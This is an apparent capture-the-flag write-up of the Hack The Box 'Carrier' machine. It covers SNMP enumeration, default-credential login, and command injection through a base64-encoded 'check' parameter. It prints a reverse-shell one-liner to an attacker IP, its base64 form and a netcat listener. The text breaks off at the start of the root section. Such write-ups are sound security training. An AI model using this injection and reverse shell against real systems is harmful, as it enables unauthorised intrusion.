*Note: I completed this challenge on January 12th, 2019, however I'm just now writing it up in December 2019. As such, some of the details are sparse.*

## User
To begin the enumeration process, a port scan was run against the target using `masscan`. The purpose of "this initial scan is to quickly determine which ports are open so that a more focused `nmap` scan can be performed that will target only the open ports discovered by `masscan`.

```
root@kali:~/workspace/hackthebox/Carrier# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.105

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-24 15:19:16 GMT

Discovered open port 22/tcp on 10.10.10.105  
...
```

From `masscan`, it was revealed that TCP ports 22(SSH) and 80(HTTP) were listening for connections. Using this information, a second scan was run using `nmap` to more thoroughly examine the services listening on the discovered ports.

```

As expected, the service listening on port 22 is SSH and the service listening on port 80 is HTTP. 

At this time, an additional `nmap` scan was run on 100 UDP ports.

```

```

This scan reveals the SNMP (Simple Network Management Protocol) on UDP port 161.

Starting with TCP port 80, browsing to `http://10.10.10.105` directs the user to a "Lyghtspeed" login portal. 

![lyghtspeed_login.png](/assets/images/htb/carrier/lyghtspeed_login.png)

Interestingly enough, the page loads with some errors (`Error 45007` and `Error 45009`). The errors are present before interacting with the website in any way. Simple username password combinations were entered into the login form in an attempt to authenticate to the web application, but to no avail.

Continuing on, a `gobuster` scan was initiated in hopes of enumerating directories present on the webserver.

```
root@kali:~/workspace/hackthebox/Carrier# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.105
```

A variety of directories were discovered by `gobuster` shortly after the scan was launched.

```
/img (Status: 301)
/tools (Status: 301)
/doc (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/debug (Status: 301)
/server-status (Status: 403)
```

Enumerating these directories further revealed some interesting information. The `/img` directory is where the "Lyghtspeed" logo is stored and the `/tools` directory contains a `remote.php` file which suggests that the web server runs PHP code. The most interesting directory is `/doc` which contains two files; `diagram_for_tac.png` and `error_codes.pdf`.

The `diagram_for_tac.png` is a diagram that represents three routers that appear to belong to three different companies (perhaps ISPs); `Lyghtspeed Networks`, `Zaza Telecom`, and `CastCom`. Additionally, the diagram includes autonomous system numbers, or AS numbers for each company. As part of the Border Gateway Protocol (BGP) routing protocol, ASNs are used to uniquely identify each network on the internet. 

![isp_diagram.png](/assets/images/htb/carrier/isp_diagram.png)

The `error_codes.pdf` document contains a two column table that provides a description for a variety of error codes, including the error codes `45007` and `45009` that were found on the Lyghtspeed login page.

![error_codes.png](/assets/images/htb/carrier/error_codes.png)

From this table, `Error 45007` is due to an invalid or expired license while `Error 45009` reports that system credentials have not been set, and that the default `admin` user's password is that of the chassis serial number.

Next, the `snmp_login` Metasploit module was used to attempt to login to the SNMP service on UDP port 161.

![snmp_login.png](/assets/images/htb/carrier/snmp_login.png)

Running the module with `run` results in the following output:

```
msf5 auxiliary(scanner/snmp/snmp_login) > run

[!] No active DB -- Credential data will not be saved!
[+] 10.10.10.105:161 - Login Successful: public (Access level: read-write); Proof (sysDescr.0): 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

This confirms that the SNMP service on UDP 161 is using the default `public` community, and that `read-write` permissions are set for the `public` community.

Further enumerating SNMP with the `snmpwalk` tool reveals the following information:

```
root@kali:~/workspace/hackthebox/Carrier# snmpwalk -v1 -c public 10.10.10.105
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
End of MIB
```

The `STRING: "SN#NET_45JDX23` output suggets a possible chassis serial number that could be the `admin` user's default password, as previously mentioned in the `error_codes.pdf` document.

Moving focus back to the Lyghtspeed login page, the web application can be successfully authenticated to using the username/password combination of `admin` / `NET_45JDX23`. Once logged in, access to the dashboard, Lyghtspeed ticketing system, and diagnostics panel is granted.

![authenticated.gif](/assets/images/htb/carrier/authenticated.gif)

There are a couple of interesting things to note here. 

First, taking a closer look at the notes accessible from the "Tickets" page reveals some potentially useful information. The content of the juciest note is shown below.

```
Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a 
problem with some of their routes being leaked again due to a misconfiguration on our 
end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday.
Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,
10.120.16,10.120.17/24's, one of their VIP is having issues connecting by FTP to an 
important server in the 10.120.15.0/24 network, investigating... Updated 2018/06/16: No 
prbl. found, suspect they had stuck routes after the leak and cleared them manually.
```

This content does not seem extremely relevant at the moment, but it could come in handly later. The note suggets that there are some potential network routing issues and that there is an important FTP server in the `10.120.15.0/24` network. The fact that an upstream ISP is reporting that their routes are being "leaked" suggests that the Lyghtspeed ISP may be advertising routes incorrectly through BGP. Recall the diagram mentioned previously that represents three ISPs and their respective ASNs.

Second, clicking the "Verify status" button on the "Diagnostics" page results in the return of some diagnostic information.

![diag_status.png](/assets/images/htb/carrier/diag_status.png)

The format of this output suggests that a command such as `ps waux` is being run on the system when the "Verify status" button is clicked. For comparison purposes, the `ps waux | grep tmux` command was run on the attacking system, which results in the following output. Note the similarities to the output in the screenshot above.

```
root       2371  0.0  0.0   7228  3908 ?        Ss   08:12   0:01 tmux new -s VPN
root       2591  0.0  0.0   6240  2832 pts/0    S+   08:19   0:00 tmux new -s HTB
root       4418  0.0  0.0   6140   900 pts/3    S+   11:15   0:00 grep tmux
```

Knowing this, the request that is made to the server upon clicking "Verify status" was examined using `burpsuite`. 

```
POST /diag.php HTTP/1.1
Host: 10.10.10.105
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0

check=cXVhZ2dh
```

From this, the `check` parameter can be modified to achieve different results. For example, removing the `cXVhZ2dh` string from the `check` parameter results in no information being returned from the status check. The characters within `cXVhZ2dh` are all valid base64-encoded characters. Placing the `cXVhZ2dh` value in a local `check.txt` file on the attacking machine and utilizing the `base64` tool to decode the content of the file revals the following:

```
root@kali:~/workspace/hackthebox/Carrier# base64 -d check.txt 
quagga
```

"Quagga" is a network routing software suite for Linux that facilitates the implementation and management of routing protocols such as BGP. It appears that the "Verify status" check is passing the value of the `check` parameter to a command similar to `ps waux | grep $check`, where `$check` is a base64 encoded string.

Burp Suite's "Repeater" functionality was used to test whether there is input sanitzation in place within the PHP code that runs the "Verify status" check. In a request to the webserver, the base64-encoded value `O2xzCg==` was passed as the `check` parameter. The base64-encoded value corresponds to the UTF-8 string `;ls`. This process and the result of the test is shown in the image below.

![sanitize_check.png](/assets/images/htb/carrier/sanitize_check.png)

This confirms that the "Verify status" check is not sanitizing input passed as the `check` parameter and that remote code execution is possible because of this flaw. To gain access to the system, the reverse shell command shown below can be used.

```
;sh -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

The command above needs to be base64-encoded, which results in the following string:

```
O3NoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCAwPiYxCg==
```

After starting a listener on the attacking system with `nc -lp 4444` and passing the above value as the `check` parameter within a `POST` request to the server using `burpsuite`, a reverse shell connection from the target system is obtained.

![r1_owned.gif](/assets/images/htb/carrier/r1_owned.gif)

The `sh` shell can be upgraded using the Python shell upgrade technique as explained [here](https://mnorris.io/hackthebox/Curling/#shell_upgrade).

As the `root` user of the remote system, the `user.txt` flag can be read.

```
root@r1:~# cat user.txt
5649c41d<redacted>
```

## Root
Before moving on, it is important to note a few things.

* The hostname of the current system is `r1`.
```
root@r1:~# hostname
r1
```
* There is no `root.txt` file on this system.
```
root@r1:~# find / -name root.txt 2> /dev/null
root@r1:~# 
```
* The `authorized_keys` file in the `/root/.ssh` directory contains two public keys; one for `ppacket@carrier` and one for `root@web`.
* The machine has three network interfaces (excluding the loopback interface `lo`); `eth0: 10.99.64.2/24`, `eth1:  10.78.10.1/24`, and `eth2: 10.78.11.1/24`
* The `arp` table includes IP addresses from all of the networks listed above
```
root@r1:~# arp
Address                  HWtype  HWaddress           Flags Mask            Iface
